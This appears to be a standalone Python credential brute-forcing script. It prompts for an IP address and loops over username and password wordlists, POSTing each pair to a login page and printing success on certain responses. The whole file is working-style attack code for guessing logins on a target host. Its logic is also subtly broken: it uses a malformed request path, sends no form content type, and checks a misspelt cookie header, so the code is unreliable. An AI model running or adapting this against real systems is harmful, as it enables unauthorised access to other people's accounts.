import http.client, urllib.parse


def checkIP(ip):
    if (len(ip) == 0): return False
    ipSplit = ip.split('.')
    if (len(ipSplit) != 4):
        return False
    for value in ipSplit:
        try: 
            value = int(value)
            if(value < 0) or (value > 255):
                return False
        except: return False
    return True


ipAddr = ''

while not checkIP(ipAddr):
    ipAddr = input('Enter IP(Only worked with IP): ')

usernameFile = open('username.txt')
passwordFile= open('password.txt')

userList = usernameFile.readlines()
passwordList = passwordFile.readlines()

for user in userList:
    user = user.strip()
    for password in passwordList:
        password = password.strip()
        parameter = urllib.parse.urlencode(
            {
                'username': user,
                'password': password
            }
        )
        conn = http.client.HTTPConnection(ipAddr)
        conn.request('POST', 'login.html', parameter)
        response = conn.getresponse()
        
        if(response.status == 200) and (response.getheader('Set-Cookies')):
            print('Logged successful!')